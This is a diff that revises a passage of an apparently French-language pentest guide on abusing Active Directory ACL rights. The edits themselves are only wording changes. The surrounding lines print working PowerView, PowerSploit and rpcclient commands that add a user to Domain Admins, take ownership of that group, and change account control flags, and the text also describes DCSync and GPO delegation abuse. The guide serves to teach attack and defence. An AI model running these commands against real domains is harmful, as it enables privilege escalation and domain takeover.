@@ -21,7 +21,7 @@ Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
 ```
 ## **Droits GenericAll sur le Groupe**
 
-Ce privilège permet à un attaquant de manipuler les appartenances aux groupes s'il a des droits `GenericAll` sur un groupe comme `Domain Admins`. Après avoir identifié le nom distingué du groupe avec `Get-NetGroup`, l'attaquant peut :
+Ce privilège permet à un attaquant de manipuler les appartenances aux groupes s'il a des droits `GenericAll` sur un groupe comme `Domain Admins`. Après avoir identifié le nom distinctif du groupe avec `Get-NetGroup`, l'attaquant peut :
 
 - **S'ajouter au Groupe des Domain Admins** : Cela peut être fait via des commandes directes ou en utilisant des modules comme Active Directory ou PowerSploit.
 ```powershell
@@ -44,7 +44,7 @@ Si un utilisateur a des droits `WriteProperty` sur tous les objets pour un group
 ```powershell
 net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
 ```
-## **Auto (Auto-Appartenance) dans le Groupe**
+## **Auto (Auto-Membre) sur le Groupe**
 
 Ce privilège permet aux attaquants de s'ajouter à des groupes spécifiques, tels que `Domain Admins`, via des commandes qui manipulent directement l'appartenance au groupe. L'utilisation de la séquence de commandes suivante permet l'auto-ajout :
 ```powershell
@@ -72,7 +72,7 @@ rpcclient -U KnownUsername 10.10.10.192
 ```
 ## **WriteOwner sur le groupe**
 
-Si un attaquant découvre qu'il a des droits `WriteOwner` sur un groupe, il peut changer la propriété du groupe en sa faveur. Cela a un impact particulier lorsque le groupe en question est `Domain Admins`, car changer la propriété permet un contrôle plus large sur les attributs et l'appartenance du groupe. Le processus implique d'identifier l'objet correct via `Get-ObjectAcl` puis d'utiliser `Set-DomainObjectOwner` pour modifier le propriétaire, soit par SID soit par nom.
+Si un attaquant découvre qu'il a des droits `WriteOwner` sur un groupe, il peut changer la propriété du groupe en sa faveur. Cela a un impact particulier lorsque le groupe en question est `Domain Admins`, car changer la propriété permet un contrôle plus large sur les attributs et l'appartenance du groupe. Le processus consiste à identifier l'objet correct via `Get-ObjectAcl` puis à utiliser `Set-DomainObjectOwner` pour modifier le propriétaire, soit par SID, soit par nom.
 ```powershell
 Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
 Set-DomainObjectOwner -Identity S-1-5-21-2552734371-813931464-1050690807-512 -OwnerIdentity "spotless" -Verbose
@@ -106,13 +106,13 @@ $ADSI.psbase.commitchanges()
 ```
 ## **Réplication sur le Domaine (DCSync)**
 
-L'attaque DCSync exploite des permissions de réplication spécifiques sur le domaine pour imiter un contrôleur de domaine et synchroniser des données, y compris des identifiants d'utilisateur. Cette technique puissante nécessite des permissions telles que `DS-Replication-Get-Changes`, permettant aux attaquants d'extraire des informations sensibles de l'environnement AD sans accès direct à un contrôleur de domaine. [**En savoir plus sur l'attaque DCSync ici.**](../dcsync.md)
+L'attaque DCSync exploite des permissions de réplication spécifiques sur le domaine pour imiter un Contrôleur de Domaine et synchroniser des données, y compris des identifiants d'utilisateur. Cette technique puissante nécessite des permissions telles que `DS-Replication-Get-Changes`, permettant aux attaquants d'extraire des informations sensibles de l'environnement AD sans accès direct à un Contrôleur de Domaine. [**En savoir plus sur l'attaque DCSync ici.**](../dcsync.md)
 
 ## Délégation GPO <a href="#gpo-delegation" id="gpo-delegation"></a>
 
 ### Délégation GPO
 
-L'accès délégué pour gérer les objets de stratégie de groupe (GPO) peut présenter des risques de sécurité significatifs. Par exemple, si un utilisateur tel que `offense\spotless` se voit déléguer des droits de gestion de GPO, il peut avoir des privilèges tels que **WriteProperty**, **WriteDacl**, et **WriteOwner**. Ces permissions peuvent être abusées à des fins malveillantes, comme identifié en utilisant PowerView : `bash Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`
+L'accès délégué pour gérer les Objets de Politique de Groupe (GPO) peut présenter des risques de sécurité significatifs. Par exemple, si un utilisateur tel que `offense\spotless` se voit déléguer des droits de gestion de GPO, il peut avoir des privilèges tels que **WriteProperty**, **WriteDacl**, et **WriteOwner**. Ces permissions peuvent être abusées à des fins malveillantes, comme identifié en utilisant PowerView : `bash Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`
 
 ### Énumérer les Permissions GPO
 
